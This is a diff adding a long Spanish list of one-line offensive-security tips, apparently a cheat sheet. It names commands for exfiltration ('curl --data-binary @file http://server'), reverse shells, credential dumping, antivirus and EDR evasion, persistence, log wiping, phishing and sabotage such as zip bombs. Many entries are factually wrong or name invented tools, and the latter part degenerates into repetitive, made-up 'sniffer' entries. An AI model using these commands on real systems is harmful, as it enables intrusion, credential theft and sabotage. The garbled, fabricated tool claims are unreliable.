@@ -1,0 +1,588 @@
+Configura Nginx como proxy para ofuscar tu infraestructura C2
+Usa "msfvenom" para generar payloads personalizados con encoder
+Desactiva scripts automáticos en tu entorno de pruebas
+Envenena DNS con "ettercap -T -M arp // //"
+Utiliza "dnschef" para falsificar respuestas DNS en pruebas
+Crea redirecciones reversas con "socat TCP-LISTEN:port,fork TCP:host:port"
+Intercepta tráfico HTTPS con "mitmproxy --mode transparent"
+Configura "Responder" para ataques LLMNR y NetBIOS en redes locales
+Usa "impacket-secretsdump" para volcar hashes de dominio
+Establece shells seguras con "ssh -D 9050 user@host"
+Infecta documentos Word con "evil-winrm" y macros embebidas
+Evita análisis estáticos usando "obfuscate.ps1" en PowerShell
+Usa "CrackMapExec" para movimientos laterales en redes Windows
+Inyecta DLLs con "sc.exe create" y eleva permisos
+Realiza exfiltración con "curl --data-binary @file http://server"
+Manipula el registro de Windows con "reg add HKCU\\... /f"
+Configura tareas persistentes con "schtasks /create /tn ... /tr ..."
+Crea servidores de exfiltración con "python3 -m http.server"
+Utiliza "proxify" para analizar y manipular tráfico HTTP
+Realiza escaneos de subdominios con "subfinder -d domain.com"
+Intercepta credenciales Wi-Fi con "airgeddon" en modo AP falso
+Usa "nmap --script smb-enum-shares.nse" para enumeración SMB
+Analiza rutas abiertas con "pathping" y analiza retrasos
+Evita detección de antivirus con "packer.py --encode payload"
+Identifica archivos secretos en servidores con "gobuster dir"
+Captura sesiones RDP con "xrdp-screenshot"
+Ejecuta scripts en remoto con "psexec.py user@host cmd.exe"
+Utiliza "bloodhound" para mapear relaciones Active Directory
+Intercepta tráfico DNS con "tcpdump port 53"
+Fuerza autenticaciones SMB con "ntlmrelayx -t smb://victim"
+Escanea redes locales con "arp-scan --localnet"
+Captura hashes NTLMv2 con "Responder" activado en interfaces activas
+Abusa de permisos "SeImpersonatePrivilege" con "PrintSpoofer.exe"
+Analiza headers HTTP con "curl -I http://site.com"
+Usa "smbmap -H ip --shares" para listar recursos compartidos
+Cifra mensajes con "gpg --encrypt -r user file.txt"
+Crea servidores SSH falsos para recopilar credenciales
+Usa "sqlmap -u http://site.com --dump-all" para extraer DB
+Evade IDS modificando tráfico con "fragroute"
+Captura y descifra cookies con "wireshark" y "http2decode"
+Haz tunneling SSH dinámico con "ssh -D 8080 user@host"
+Realiza fuerza bruta con "hydra -l admin -P passwords.txt host ssh"
+Intercepta contraseñas FTP con "ettercap -M arp // // -T -P ftp"
+Inyecta payloads con "msfconsole -x 'use exploit/multi/handler'"
+Usa "evil-winrm" para acceder a servidores Windows remotos
+Realiza escaneos de puertos lentos con "masscan"
+Oculta tráfico con "obfs4proxy" en conexiones Tor
+Crea un honeypot SSH con "cowrie"
+Lanza ataques de phishing con "gophish" configurado
+Intercepta formularios web con "burpsuite" modo repeater
+Crea shells reversas HTTPS con "ncat --ssl --exec /bin/bash"
+Crea un script Python de phishing con "pywebio" para capturas
+Descifra hashes bcrypt con "hashcat -m 3200"
+Accede a logs de "Sysmon" para rastrear actividades sospechosas
+Usa "Metasploit" para ataques "pass-the-hash" en SMB
+Realiza brute force en login web con "ffuf"
+Captura contraseñas en memoria con "mimikatz"
+Crea cronjobs persistentes con "crontab -e"
+Limpia logs de bash con "history -c"
+Envenena NTP con "ntpdate -q <IP>"
+Descubre subdominios ocultos con "amass enum -d dominio"
+Inicia "ngrok" para redirigir conexiones desde internet
+Utiliza "feroxbuster" para detectar rutas ocultas en webs
+Inyecta código en binarios con "shellter"
+Realiza ataques de DNS Spoofing con "bettercap"
+Escanea servicios expuestos con "shodan" API
+Intercepta tráfico TCP con "tcpflow -c port 80"
+Realiza escaneos SYN furtivos con "nmap -sS"
+Compromete redes WiFi con "wifiphisher"
+Lanza payloads PowerShell con "Invoke-Shellcode.ps1"
+Simula malware con "Empire" framework
+Usa "dnsrecon" para transferencia de zonas DNS
+Enmascara tráfico con VPNs "WireGuard" en servidores
+Abusa de "MSBuild" para ejecución de scripts maliciosos
+Instala backdoors en macros Excel con "xlsgen"
+Utiliza "Netcat" para persistencia en redes internas
+Despliega reverse proxies con "reGeorg"
+Abusa de servicios expuestos con "impacket-wmiexec"
+Analiza tráfico ARP sospechoso con "arpwatch"
+Usa "dirb" para detección de directorios ocultos
+Fuerza autenticaciones web con "Intruder" de BurpSuite
+Descompila binarios con "Ghidra" para análisis reverso
+Oculta payloads en imágenes con "steghide embed"
+Captura teclas con "keylogger.py" usando PyHook
+Configura "OSSEC" para detección de intrusiones
+Usa "OpenVPN" con proxies para pivoting
+Lanza bots "C2" con "Sliver" para control remoto
+Realiza escaneos intensivos con "zmap"
+Filtra tráfico SMB con "netsed"
+Utiliza "Fierce" para enumeración DNS avanzada
+Crea shells reversas Python con "socket" y "subprocess"
+Analiza cargas útiles con "Cuckoo Sandbox"
+Escanea headers CSP con "csp-auditor"
+Escanea configuraciones vulnerables con "Lynis"
+Inyecta comandos con "sqlmap" modo "os-shell"
+Realiza ataques de fuerza bruta RDP con "rdpscan"
+Evade UAC con "Invoke-BypassUAC.ps1"
+Usa "nikto" para encontrar vulnerabilidades web
+Instala webshells con "weevely"
+Crea un túnel reverso SSH con "ssh -R 8080:localhost:80 user@host"
+Intercepta conexiones "HTTP/2" con "h2csmuggle"
+Descubre servidores vulnerables con "censys" API
+Realiza bypass de autenticación con "wpscan"
+Crea phishing móvil con "Modlishka"
+Filtra información de memoria con "strings"
+Evita detección con "PSObfuscation"
+Desarma binarios con "radare2"
+Configura proxies inversos con "nginx.conf"
+Intercepta paquetes ICMP con "icmpdump"
+Escanea puertos UDP con "nmap -sU"
+Usa "wp-scan" para encontrar plugins desactualizados
+Envenena tráfico con "Cain & Abel"
+Realiza fingerprint de sistemas con "p0f"
+Analiza certificados SSL con "sslscan"
+Intercepta peticiones DNS-over-HTTPS con "doh-sniffer"
+Configura "ettercap" con plugins personalizados
+Evade EDR con "Sharphound" y "Covenant"
+Realiza ataques CSRF con "xsser"
+Inyecta cargas útiles "XSS" con "beef-xss"
+Compila cargas útiles con "mingw-w64"
+Usa "rsync" para exfiltración rápida
+Monitoriza procesos con "procmon" en entornos Windows
+Lanza ataques "Man-In-The-Middle" con "mitmf"
+Cifra comunicaciones con "openssl enc"
+Utiliza "john --wordlist=..." para descifrar contraseñas
+Captura ventanas con "screenshot.ps1"
+Crea backdoors en servicios de "cron.daily"
+Inicia shells persistentes con "recon-ng"
+Intercepta paquetes NetBIOS con "nbtscan"
+Envenena cachés DNS con "dnsmasq"
+Usa "rebind" para realizar ataques DNS rebinding
+Crea payloads EXE con "fatrat"
+Modifica tráfico ICMP con "scapy"
+Usa "ewfmount" para análisis forense de discos
+Crea exploits con "ExploitDB" plantillas
+Configura "Splunk" para monitoreo centralizado
+Evade firewalls con "ICMP tunneling"
+Intercepta tráfico SIP con "sipsak"
+Usa "APTMiner" para identificar APTs conocidas
+Desactiva defensas Windows con "disable-defender.ps1"
+Manipula sesiones FTP con "ftpmap"
+Utiliza "frida" para ataques móviles
+Detecta inyecciones de comandos con "ossec-logtest"
+Usa "hexedit" para editar binarios en hex
+Descifra comunicaciones SMBv1 con "Metasploit smb_relay"
+Configura VPNs ofensivas con "SoftEther"
+Realiza ataques "pharming" con "dns2proxy"
+Identifica WAFs con "wafw00f"
+Crea "dropper" con "PowerSploit"
+Intercepta tráfico DNS con "dnsspoof"
+Realiza escaneos OSINT con "maltego"
+Abusa de "persistence.reg" para acceso remoto
+Lanza ataques "pass-the-ticket" con "kerberoast"
+Instala servicios con "InstallUtil.exe"
+Configura "ngrok" para pruebas web remotas
+Escanea cabeceras de cookies con "cookie-catcher"
+Simula comportamientos de malware con "Unicorn"
+Usa "pspy" para detectar procesos activos sin root
+Escanea logs web con "goaccess"
+Lanza payloads "meterpreter" con "multi/handler"
+Crea shells PHP reversas con "php-reverse-shell.php"
+Inyecta código MSBuild con "SharpShooter"
+Evade autenticación básica con "curl -u user:pass"
+Crea túneles HTTPS con "stunnel"
+Realiza ataques "credential stuffing" con "credmap"
+Lanza fuzzing con "boofuzz"
+Intercepta tokens JWT con "jwt_tool"
+Usa "proxychains" para tunelizar herramientas ofensivas
+Compromete "GPO" con "Invoke-ACLScanner.ps1"
+Realiza ataques "subdomain takeover" con "Subjack"
+Desactiva alertas "EventLog" con "Clear-EventLog"
+Usa "Covenant" para payloads de alto nivel
+Crea ataques phishing con "SET toolkit"
+Lanza escaneos de rutas ocultas con "wfuzz"
+Intercepta cookies de sesión con "cookielogger"
+Analiza "TLS fingerprints" con "tls-parser"
+Infecta documentos con "macro_pack"
+Evade filtros web con "base64" encoding
+Crea payloads AMSI bypass con "Invoke-ReflectivePEInjection"
+Intercepta autenticaciones OAuth con "oauth-sniffer"
+Simula tráfico de red con "tcpreplay"
+Realiza bruteforce SSH con "Medusa"
+Usa "XSSHunter" para detectar XSS almacenados
+Analiza integridad de binarios con "sha256sum"
+Exfiltra datos mediante "DNS tunneling"
+Inyecta comandos "Linux cronjob" con payloads bash
+Deshabilita antivirus temporalmente con "sc stop"
+Crea accesos persistentes con "net user add /active:yes"
+Analiza actividad ARP con "arpanalyzer"
+Usa "kerbrute" para enumeración de usuarios en Active Directory
+Realiza ataques "waterhole" con servidores HTTP falsos
+Configura proxies DNS con "dnscrypt-proxy"
+Intercepta tráfico HTTP2 con "mitmproxy --http2"
+Realiza "smuggling attacks" con "smuggler.py"
+Captura credenciales en redes LAN con "Bettercap"
+Usa "quark-engine" para análisis de malware Android
+Identifica RCE en headers HTTP con "HeaderMap"
+Configura "C2 frameworks" con "Empire"
+Simula DoS con "slowloris"
+Realiza "Clickjacking tests" con "X-Frame-Options" desactivado
+Compila exploits en "C" con "gcc exploit.c -o exploit"
+Descifra contraseñas KeePass con "KeeThief"
+Configura "Sysmon" para detección avanzada
+Crea honeypots con "Dionaea"
+Descifra imágenes de disco EWF con "ewf-tools"
+Captura tráfico de red con "tcpdump -i any"
+Abusa de scripts públicos con "Pastebin scrapers"
+Utiliza "Autorecon" para escaneos automatizados
+Usa "Fierce" para ataques de DNS brute force
+Implementa SSH pivoting con "sshuttle"
+Analiza headers CORS con "corscanner"
+Genera binarios con "MSFvenom encoders"
+Intercepta "WebRTC leaks" con "BrowserLeaks tests"
+Utiliza "PyInstaller" para crear binarios de Python
+Lanza exploits SMBGhost con "EternalBlue scripts"
+Evade "Microsoft Defender" con "Rubeus"
+Realiza fuerza bruta HTTP con "Gobuster -U -P"
+Exfiltra datos con "DNSChef"
+Usa "GitLeaks" para encontrar credenciales en repos
+Detecta "Subdomain Takeovers" con "SubOver"
+Configura proxysocks con "socksify"
+Intercepta contraseñas SMBv1 con "Responder"
+Genera certificados falsos con "mkcert"
+Lanza phishing OAuth con "evilginx2"
+Usa "Frogger" para bypass de autenticación 2FA
+Intercepta tráfico con "Wireshark" filtros avanzados
+Crea "zip bombs" para sabotaje
+Utiliza "SET" para ingeniería social
+Simula beacons C2 con "Cobalt Strike"
+Deshabilita GPO local con "gpupdate /force"
+Realiza "SMB relay" con "impacket-ntlmrelayx"
+Intercepta tráfico VoIP con "sipdump"
+Detecta scripts de terceros inseguros
+Fuerza claves RSA con "John The Ripper"
+Envenena sesiones HTTP con "ETTERCAP"
+Usa "Evil-WinRM" para shells reversas PowerShell
+Descifra cadenas base64 con "base64 -d"
+Compromete Jenkins con "groovy script consoles"
+Utiliza "Spiderfoot" para OSINT automatizado
+Fuerza puertos con "nmap --ttl"
+Descubre cabeceras expuestas con "httpx"
+Realiza fuzzing de parámetros GET/POST
+Captura peticiones GraphQL con "Burpsuite"
+Usa "Zap" para detección de "insecure deserialization"
+Extrae hashes NTLM con "Impacket-smbclient"
+Evade UAC con "Bypass-UAC COM Hijack"
+Configura PowerShell remoting con "Enable-PSRemoting"
+Intercepta SSH con "EavesARP"
+Filtra datos con "Stegano" imágenes ocultas
+Fuerza rutas con "ParamSpider"
+Usa "GetUserSPNs" para ataques "Kerberoasting"
+Identifica "LDAP injection" con "ldapdomaindump"
+Crea reverse shells UDP con "netcat"
+Compromete redes con "EAP relay"
+Descifra PDF protegidos con "qpdf --decrypt"
+Usa "SQLiDumper" para dumps SQL masivos
+Intercepta transmisiones MQTT con "mqtt-spy"
+Realiza fuerza bruta de tokens JWT con "jwt-cracker"
+Escanea servicios NoSQL con "NosqlMap"
+Configura "Wireguard" para tunelización
+Abusa de "PowerView" para recolección de AD
+Intercepta SSL con "sslsplit"
+Detecta subdominios abandonados
+Filtra tráfico DNS con "dnsspoof -i iface"
+Crea fake APs con "airbase-ng"
+Intercepta paquetes multicast con "multicat"
+Compromete endpoints API con "FuzzAPI"
+Lanza "password spraying" con "Spraykatz"
+Detecta "Server Side Template Injection"
+Captura hashes SMB con "smbcap"
+Intercepta tráfico ICMP con "PingCastle"
+Utiliza "PowerUp.ps1" para escalada de privilegios
+Inyecta cargas con "Invoke-Mimikatz.ps1"
+Intercepta Telegram Bots Tokens con "Intercept.sh"
+Cifra payloads PowerShell con "SecureString"
+Realiza brute force con "Hydra"
+Compromete redes VPN con "ike-scan"
+Analiza mensajes Syslog con "Syslog-ng"
+Realiza fuzzing HTTP headers
+Intercepta autenticaciones OAuth
+Utiliza "Nishang" para ejecución remota
+Configura túneles reverse SSH con "autossh"
+Crea registros DKIM falsos
+Intercepta WebSockets con "WebSocket Inspector"
+Intercepta OAuth Tokens con "jwt-cli"
+Usa "PoisonTap" para ataques USB
+Inyecta comandos DNS con "dnsctl"
+Intercepta credenciales Wi-Fi con "WiFi-Pumpkin"
+Usa "Responder" para capturar peticiones LLMNR
+Configura "Burp Collaborator" para ataques de explotación
+Realiza ataques "CSRF" con formularios HTML falsos
+Usa "Hakrawler" para descubrir endpoints web ocultos
+Evade autenticación 2FA con "Evilginx"
+Cifra tráfico DNS con "DoH-client"
+Realiza fuzzing de rutas con "Dirsearch"
+Configura ataques DHCP con "Yersinia"
+Intercepta tráfico SMB con "mitm6"
+Escanea aplicaciones móviles con "MobSF"
+Genera exploits de buffer overflow con "pattern_create"
+Filtra tráfico con "iptables" usando reglas avanzadas
+Usa "dnsenum" para descubrimiento DNS
+Lanza ataques DoS con "hping3" configurado
+Realiza enumeración LDAP con "ldapsearch"
+Intercepta tráfico "mDNS" con "avahi-browse"
+Configura "Bettercap" para MITM avanzado
+Extrae contraseñas de memoria con "Volatility"
+Configura reverse shells PHP con "backdoor.php"
+Usa "MSFVenom" para crear DLL maliciosas
+Realiza sniffing ICMP con "icmpsh"
+Utiliza "SecLists" para diccionarios avanzados
+Intercepta tokens JWT con "jwt-hack"
+Configura autenticación bypass con "X-AUTH"
+Evita detección EDR con "obfuscation.ps1"
+Lanza "dnsrecon" para transferencias de zonas DNS
+Compromete páginas HTML con "BeEF"
+Usa "Metasploit" para lanzar módulos SMB exploit
+Descompila apps móviles con "APKTool"
+Intercepta peticiones WebSocket con "Burp Suite"
+Cifra mensajes con "AES256" usando "openssl"
+Crea payloads shellcode con "msfvenom"
+Escanea redes locales con "Fping"
+Intercepta peticiones DNS con "tcpdump port 53"
+Configura DNS tunneling con "iodine"
+Realiza ataques NTLM relay con "impacket-ntlmrelayx"
+Crea "wordlists" personalizados con "CeWL"
+Compromete paneles de administración con "wpscan"
+Intercepta tráfico de FTP con "ettercap -T"
+Inicia escaneos masivos con "masscan --rate"
+Genera reportes con "Dradis Framework"
+Compromete servidores SSH con "ssh-keygen -f"
+Captura handshakes Wi-Fi con "airodump-ng"
+Configura "reGeorg" para túneles HTTP reversos
+Intercepta peticiones OAuth con "jwt_tool"
+Usa "Obsidian" para análisis colaborativo
+Cifra peticiones HTTP con "stunnel"
+Lanza fuerza bruta HTTP con "FFUF"
+Detecta "SSTI" con "tplmap"
+Crea shells PowerShell con "Invoke-WebRequest"
+Intercepta tráfico SSL con "sslstrip"
+Realiza fuzzing de APIs REST con "Postman"
+Escanea sitios web con "WhatWeb"
+Genera backdoors persistentes con "Empire"
+Intercepta sesiones RDP con "RDPHijack"
+Crea shells reversas UDP con "bash -i"
+Genera exploits PHP con "php-reverse-shell"
+Usa "impacket" para ejecución remota SMB
+Intercepta tráfico MQTT con "mqttfx"
+Utiliza "Amass" para enumeración OSINT
+Intercepta credenciales HTTP con "SniffHTTP"
+Escanea subdominios con "Subfinder"
+Configura "iptables" para bloqueo de IPs específicas
+Analiza logs con "LogParser"
+Crea scripts bash para pivoteo con "sshpass"
+Genera payloads con "Shellter"
+Intercepta tráfico VNC con "vncviewer -listen"
+Realiza fuerza bruta LDAP con "ldap-brute"
+Intercepta tráfico Bluetooth con "hcitool"
+Configura phishing con "Social-Engineer Toolkit"
+Intercepta tráfico SMBv2 con "smbclient"
+Intercepta sesiones HTTPS con "SSLsplit"
+Intercepta contraseñas SNMP con "onesixtyone"
+Usa "ExploitDB" para descarga de exploits
+Intercepta autenticaciones LDAP con "mitmproxy"
+Configura honeypots SSH con "Cowrie"
+Intercepta tráfico WebRTC con "BrowserLeaks"
+Intercepta credenciales POP3 con "netcat"
+Realiza "ARP spoofing" con "arpspoof"
+Intercepta transmisiones TCP con "tcpflow"
+Escanea sistemas Windows con "winexe"
+Crea wordlists personalizadas con "crunch"
+Intercepta peticiones HTTP con "mitmproxy"
+Cifra archivos con "GPG --encrypt"
+Intercepta comunicaciones Telnet con "telnet"
+Usa "Veil" para generar payloads ofuscados
+Realiza fuzzing XML con "XXEInjector"
+Configura "Snort" para detección de intrusiones
+Intercepta contraseñas IMAP con "nc"
+Intercepta tráfico multicast con "mtools"
+Intercepta datos SMB con "Packetbeat"
+Genera exploits "buffer overflow" con "ropgadget"
+Intercepta credenciales Kerberos con "Rubeus"
+Intercepta credenciales NetBIOS con "Responder"
+Configura "Tor" para navegación anónima
+Intercepta tráfico USB con "usbmon"
+Intercepta credenciales SQL con "sql-sniffer"
+Intercepta credenciales RDP con "rdpy-sniffer"
+Intercepta contraseñas SMTP con "smtp-sniffer"
+Intercepta tráfico TCP/IP con "tcpdump -A"
+Intercepta contraseñas HTTP con "tcpflow"
+Configura "SSH forwarding" con "ssh -L"
+Intercepta tokens OAuth con "oauth-token-snipe"
+Intercepta tráfico DNS con "dns-sniffer"
+Intercepta tráfico HTTP con "http-sniffer"
+Intercepta credenciales SMB con "impacket"
+Intercepta tráfico SMBv3 con "tcpdump port 445"
+Intercepta tráfico SMBv1 con "tcpdump -X"
+Intercepta contraseñas Wi-Fi con "wifiphisher"
+Intercepta tráfico VoIP con "sipdump"
+Intercepta credenciales HTTP2 con "mitmproxy --http2"
+Intercepta tráfico FTP con "ettercap -M"
+Intercepta tráfico DHCP con "Yersinia"
+Intercepta sesiones HTTPS con "mitmproxy -ssl"
+Intercepta contraseñas LDAP con "ldap-sniffer"
+Intercepta tokens JWT con "jwt-crack"
+Intercepta tráfico DNS con "dnssniff"
+Intercepta credenciales WebSocket con "ws-sniff"
+Intercepta cookies HTTP con "cookie-sniffer"
+Intercepta tráfico MQTT con "mqtt-sniff"
+Intercepta tráfico SOAP con "soap-sniff"
+Intercepta tráfico SMBv1 con "impacket"
+Intercepta tráfico NetBIOS con "netbios-sniffer"
+Intercepta contraseñas POP3 con "pop-sniff"
+Intercepta contraseñas IMAP con "imap-sniffer"
+Intercepta tráfico Telnet con "telnet-sniffer"
+Intercepta contraseñas SNMP con "snmp-sniff"
+Intercepta tráfico NetFlow con "netflow-sniffer"
+Intercepta tráfico sFlow con "sflow-sniffer"
+Intercepta tráfico jFlow con "jflow-sniffer"
+Intercepta sesiones SSH con "ssh-sniffer"
+Intercepta tráfico RDP con "rdp-sniffer"
+Intercepta tráfico HTTP con "http-sniffer"
+Intercepta tráfico FTP con "ftp-sniffer"
+Intercepta tráfico HTTPS con "https-sniffer"
+Intercepta tráfico DNS con "dns-sniffer"
+Intercepta tráfico DHCP con "dhcp-sniffer"
+Intercepta tráfico ARP con "arp-sniffer"
+Intercepta tráfico SIP con "sip-sniffer"
+Intercepta tráfico H323 con "h323-sniffer"
+Intercepta tráfico RTP con "rtp-sniffer"
+Intercepta tráfico RTCP con "rtcp-sniffer"
+Intercepta tráfico RTSP con "rtsp-sniffer"
+Intercepta tráfico HTTP/2 con "http2-sniffer"
+Intercepta tráfico WebSockets con "ws-sniffer"
+Usa "Empire" para operaciones de control y post-explotación
+Inyecta DLL con "rundll32.exe your.dll,EntryPoint"
+Compromete credenciales mediante phishing con "GoPhish"
+Usa "ExifTool" para ocultar datos en metadatos de imágenes
+Realiza ataques de deserialización con "ysoserial"
+Crea proxies inversos HTTPS con "frp"
+Realiza ataques "Cache Poisoning" en servidores DNS
+Inyecta payloads en PDFs con "PDFcrack" y "Metasploit"
+Descubre configuraciones inseguras con "ScoutSuite"
+Usa "BloodHound" para enumeración avanzada de AD
+Evade análisis dinámico con "Rundll32" técnicas de evasión
+Intercepta credenciales OAuth en aplicaciones móviles
+Lanza exploits de "EternalRomance" con "Metasploit"
+Simula usuarios con "impersonate-user.ps1"
+Usa "Invoke-Phant0m" para ocultar procesos en memoria
+Captura credenciales SMBv2 con "Inveigh"
+Utiliza "PowerShell Empire" para ejecutar scripts obfuscados
+Configura phishing masivo con "evilnginx"
+Inyecta shellcode en procesos remotos con "Powersploit"
+Usa "Invoke-ReflectiveDLLInjection" para inyecciones DLL
+Configura servidores C2 con "Merlin"
+Intercepta tráfico RDP y ejecuta comandos con "xfreerdp"
+Usa "SharpHound" para generar gráficos de relaciones AD
+Realiza ataques SSRF con "SSRFmap"
+Configura reglas de bypass en "iptables"
+Evade firewalls con "ProxyChains" encadenado
+Descubre secretos en contenedores Docker con "Trivy"
+Usa "Chisel" para tunneling HTTP/HTTPS
+Automatiza exfiltración de archivos con "Rclone"
+Configura túneles SSH reversos con "ngrok ssh"
+Explota vulnerabilidades SMB con "psexec.py"
+Intercepta sesiones "VNC" con herramientas de sniffing
+Inicia shells interactivas con "socat exec"
+Evade autenticación LDAP con "ldap-pwn"
+Usa "Termshark" para análisis de tráfico similar a Wireshark
+Realiza "DNS brute forcing" con "dnsx"
+Configura C2 persistente con "PoshC2"
+Usa "CrackMapExec" para listar recursos compartidos en SMB
+Inyecta tareas programadas con "schtasks" oculto
+Descifra contraseñas de hashes SAM con "Impacket-secretsdump"
+Escanea cabeceras HTTP con "httpx -title"
+Usa "Gobuster" para detectar páginas ocultas por error 403
+Extrae contraseñas de "dpapi" con "Mimikatz"
+Detecta "Rogue DHCP Servers" con "dhcpdump"
+Usa "PACu" para pruebas de seguridad en AWS
+Crea shells inversas persistentes con "Nishang"
+Desarma payloads con "Radare2"
+Realiza fuzzing de peticiones HTTP con "wfuzz -z"
+Intercepta correos electrónicos con "setoolkit"
+Utiliza "Sharpshooter" para crear documentos armados
+Evita detección de antivirus con "Invoke-Obfuscation"
+Simula ataques de fuerza bruta "kerberoast" con "Rubeus"
+Genera reportes automatizados con "Faraday"
+Usa "dnscat2" para tunelización mediante DNS
+Escanea vulnerabilidades de rutas con "Path Traversal Fuzzer"
+Inicia peticiones HTTP falsas con "requests-faker"
+Analiza "headers HTTP" con "Fiddler"
+Intercepta credenciales API con "Burp Repeater"
+Escanea imágenes de disco virtual con "Autopsy"
+Utiliza "AQUATONE" para análisis de subdominios
+Crea redes WiFi falsas con "hostapd"
+Intercepta procesos de PowerShell con "Sysmon"
+Lanza payloads ofuscados con "Invoke-Shellcode"
+Analiza payloads ofuscados con "CyberChef"
+Extrae archivos embebidos con "binwalk"
+Configura "Splunk" para centralizar logs
+Realiza análisis de malware de PDF con "Didier Stevens PDF tools"
+Usa "cracklord" para orquestar cracking distribuido
+Ejecuta procesos como servicios ocultos con "sc.exe"
+Intercepta autenticaciones SMB con "Lateral Movement Toolkit"
+Cifra peticiones con "OpenSSL" en modo AES
+Descifra archivos con claves AES con "openssl enc -aes-256-cbc"
+Explota "Weak JWT Secrets" con "jwtcat"
+Usa "ADRecon" para generar reportes completos de AD
+Intercepta tokens de sesión con "session sniffer"
+Crea redirecciones DNS con "Dnsmasq"
+Usa "Zerologon Exploit" para comprometer controladores de dominio
+Realiza fuerza bruta de directorios web con "dirb -w"
+Captura pantallas remotas con "screenSpy"
+Intercepta comandos de PowerShell remotos con "PSSession"
+Extrae hashes con "hashdump" de "Meterpreter"
+Evita detección con "Process Doppelgänging"
+Analiza scripts Powershell maliciosos con "PSDecode"
+Genera ataques ROP con "ROPgadget"
+Inyecta shellcode en memoria con "ScareCrow"
+Descubre API expuestas con "APIHunter"
+Simula comportamientos de APT con "Atomic Red Team"
+Evade autenticación básica con "curl -k -u user:pass"
+Intercepta comunicaciones TLS/SSL con "ssldump"
+Crea payloads VBA con "macro_pack"
+Detecta vulnerabilidades NFS con "nfs-checker"
+Extrae binarios de RAM con "DumpIt"
+Intercepta tráfico ICMP con "PingTunnel"
+Lanza fuzzing de entradas JSON con "JSONFuzzer"
+Usa "JA3 fingerprinting" para detección de tráfico TLS sospechoso
+Inyecta código con "DLL Hijacking" usando servicios legítimos
+Desactiva servicios críticos con "sc config" para sabotaje
+Usa "Invoke-Command" para ejecutar scripts remotamente
+Configura "SOCAT" para shells interactivas
+Intercepta tráfico ICMP con "icmp-relay"
+Realiza fingerprint de sistemas operativos con "os-fingerprinting"
+Cifra archivos en lote con "GPG -r user --encrypt-files *.txt"
+Usa "ProxyTunnel" para exfiltración sobre HTTP/S
+Detecta "Race Conditions" en APIs con "RaceTheWeb"
+Explora subdominios y puertos con "subzy"
+Intercepta "pipes" anónimos con "PipeView"
+Evade restricciones de ejecución con "AppLocker Bypass"
+Intercepta claves SSH con "ssh-agent sniffer"
+Realiza movimientos laterales con "WMIexec"
+Desactiva políticas UAC con "registry keys"
+Descifra contraseñas PDF con "pdfcrack"
+Descifra claves protegidas AES con "AESKeyBrute"
+Intercepta paquetes mDNS con "mDNS-spy"
+Configura accesos persistentes con "Registry Persistence"
+Evade sistemas DLP con "OutlookRules Exploit"
+Intercepta tráfico SOCKS con "proxytunnel"
+Intercepta peticiones PUT/DELETE con "REST API Inspector"
+Crea "crontab" malicioso para persistencia
+Usa "PowerShell Loops" para enumeración masiva
+Intercepta tráfico de C2 ocultos con "DNSpionage"
+Descubre servicios internos expuestos con "tunnelblick"
+Crea conexiones remotas con "plink.exe"
+Intercepta autenticaciones Kerberos con "MIT Kerberos Sniffer"
+Usa "Remote Potato" para escalada de privilegios
+Automatiza ataques SMB con "smbexec"
+Inyecta comandos usando "XXE Payloads"
+Descubre variables de entorno filtradas con "envgrabber"
+Intercepta tráfico RMI con "RMI Sniffer"
+Configura redes "Tor Hidden Services" con "onionbalance"
+Intercepta tráfico MQTT usando "mosquitto_sub"
+Usa "Portspoof" para confundir escaneos de puertos
+Detecta "SQL injection" con "SQLBrute"
+Realiza fuzzing de bibliotecas con "AFL++"
+Usa "PsExec" para ejecución remota en redes Windows
+Realiza ataques LDAP con "ldap-brute"
+Compromete credenciales de sesiones SSO con "SessionReplay"
+Intercepta servicios RESTful con "REST-Client"
+Usa "JWT Inspector" para detectar "Token Replay"
+Configura "iptables" para redirección forzada de puertos
+Automatiza escaneos OSINT con "Recon-ng"
+Usa "Fastjson Exploit" para bypass de autenticación en APIs
+Realiza "Token Impersonation" con "Rubeus"
+Intercepta credenciales de OAuth 2.0 con "burp suite"
+Genera diccionarios personalizados con "WordSmith"
+Intercepta certificados X.509 con "certwatch"
+Crea exploits de ejecución remota con "Ghidra Debugger"
+Realiza enumeración con "enum4linux-ng"
+Intercepta peticiones gRPC con "gRPC-Dumper"
+Lanza fuzzing contra microservicios con "Go-Fuzz"
+Realiza fingerprinting de TLS con "TLSProbe"
+Intercepta credenciales "IAM" en entornos cloud
+Detecta "Serverless Functions" expuestas
+Descubre "API Gateway Bypasses" con "GatewayScanner"
+Intercepta tráfico AMQP con "AMQP-Sniffer"
+Intercepta mensajes IoT con "MQTT-Dumper"
